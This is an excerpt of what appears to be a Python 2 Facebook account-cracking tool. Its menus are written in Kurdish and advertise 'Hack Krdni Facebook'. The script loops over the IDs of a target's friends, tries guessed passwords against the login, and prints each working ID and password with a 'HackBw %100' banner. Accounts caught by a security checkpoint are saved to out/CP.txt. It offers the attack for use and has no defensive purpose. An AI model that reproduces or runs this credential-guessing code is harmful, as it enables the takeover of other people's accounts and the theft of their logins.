...
os.system("clear")
print "࿇ ══━━━━✥ⓌⒺⓁⒸⓄⓂ︎Ⓔ✥━━━━══ ࿇"
print "BASHTRIN TOOLI HACK KRDNI FACEBOOK"
print  """
...
def menu():
    ...
    print "[!] Subs: "+sub+"/"
    print "----------------------------------------------------"
    print "\033[1;32;40m[1] \033[1;33;40m<1>Hack Krdni Facebook"    
    print "\033[1;32;40m[2] \033[1;33;40m<2>UPDATE KRDNI TOOL"                                                                                                                        
    print "\033[1;32;40m[0] \033[1;33;40m<0>DARCHWN"
    pilih()
...
def super():
    ...
    os.system('clear')
    print logo
    print "\x1b[1;32;40m[1] \033[1;33;40m<1<HACK KRDNI HAWREKANT"
...
def pilih_super():
    ...
    print "\033[1;36;40m[∞] HAMW ID YAKAN : \033[1;94m"+str(len(id))
    jalan('\033[1;34;40m[∞] DAST PE KRDNI HACK ...')
    titik = ['.   ','..  ','... ']
    for o in titik:
    ...
    jalan('          \033[1;91mWAIT 10min___________30min')
    print  "---------------------------------------------------" 
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                if 'www.facebook.com' in q["error_msg"]:
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\n\x1b╔[1;92m[HackBw %100]' + '\n║ID: ' + user  + ' \n║PASS:  ' + pass2 + '\n╚Name: ' + b['name']
                        oks.append(user+pass2)
                    else:
                        if 'www.facebook.com' in q["error_msg"]:
                            print '\n\x1b[1;36;40m╔[Dway 7 Rozh Akretawa] \x1b[1;97m '+ '\n║ID: ' + user  + '\n║PASS: ' + pass2 + '\n╚Name: ' + b['name']
                            cek = open("out/CP.txt", "a")
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\n\x1b╔[1;92m[HackBw %100] \x1b[1;92m ' + '\n║ID: ' + user  + '\n║PASS: ' + pass3 + '\n╚Name: ' + b['name']
    ...
    print '[✓]....'
    print "[+)∞(+] \033[1;32;40mHack.Bwakan\033[1;36;40m/\033[1;31;40msorry.Dway 7 Rozh Akrenawa \033[1;36;40m: \033[1;32;40m"+str(len(oks))+"\033[1;36;40m/\033[1;31;40m"+str(len(cekpoint))
    print '\033[1;34;40m[+] ✓∅✓✓✓✓✓ : save/cp.txt'
    print """-------------------------------"""
    raw_input("\n\033[1;96m[\033[1;97mEnterBoGaranawa\033[1;96m]")
    super()
